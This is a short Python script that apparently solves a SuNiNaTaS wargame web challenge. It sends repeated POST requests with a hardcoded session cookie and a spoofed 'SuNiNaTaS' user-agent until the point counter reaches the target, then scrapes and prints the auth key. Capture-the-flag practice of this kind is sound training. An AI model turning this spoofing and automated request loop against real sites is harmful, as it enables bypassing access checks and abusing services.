import requests
import time

URL="http://suninatas.com/Part_one/web04/web04_ck.asp"
URL2="http://suninatas.com/Part_one/web04/web04.asp"
cookie={
    "ASPSESSIONIDSACATCBQ":"NDCOICIBHDOMIFBIPNHKMKJG"
    }

session1=requests.Session()
header={
    'user-agent':'SuNiNaTaS'
    }


for i in range(100) :
    data={
        'total':'0'
        }
    reqs1=session1.post(URL,cookies=cookie,data=data,headers=header)
    reqs2=session1.get(URL2,cookies=cookie)
    point = str(reqs2.text).split('value="')[3].split('" size="')[0]
    time.sleep(0.1)
    
    print ("Point : "+point)
    if int(point) == 0 :
        Auth = str(reqs2.text).split('Auth key</b></font></td>')[-1].split("</td>")[0].split(">")[-1]
        print (Auth)
        break
        
        

